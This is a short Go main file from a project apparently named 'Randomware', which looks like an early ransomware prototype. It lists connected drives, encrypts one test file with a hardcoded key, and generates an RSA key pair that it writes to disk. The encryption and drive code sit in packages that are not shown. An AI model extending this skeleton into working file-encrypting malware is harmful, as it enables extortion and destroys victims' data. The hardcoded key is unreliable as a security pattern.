package main

import (
	"Randomware/disk"
	"Randomware/file"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"log"
	"os"
)

func main() {
	//Print connected drives
	fmt.Println(disk.GetDrives())

	//Encrypt file
	key := []byte("PeterBalivet2347")
	file, err := file.Encrypt("test.mp4", key)

	if err != nil {
		os.Exit(1)
	}

	fmt.Println(file)

	//Create private/public keys
	keys, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}
	keyPubFile, err := os.Create("rsa_key.pub")
	if err != nil {
		log.Fatal(err)
	}

	_, err = keyPubFile.WriteString(fmt.Sprintf("%d\n", keys.PublicKey.N))
	_, err = keyPubFile.WriteString(fmt.Sprintf("%d\n", keys.PublicKey.E))

	keyPubFile.Close()

	keyPrivFile, err := os.Create("rsa_key.priv")
	if err != nil {
		log.Fatal(err)
	}
	_, err = keyPrivFile.WriteString(fmt.Sprintf("%d\n", keys.D))
	_, err = keyPrivFile.WriteString(fmt.Sprintf("%d\n", keys.Primes))
	keyPrivFile.Close()
}
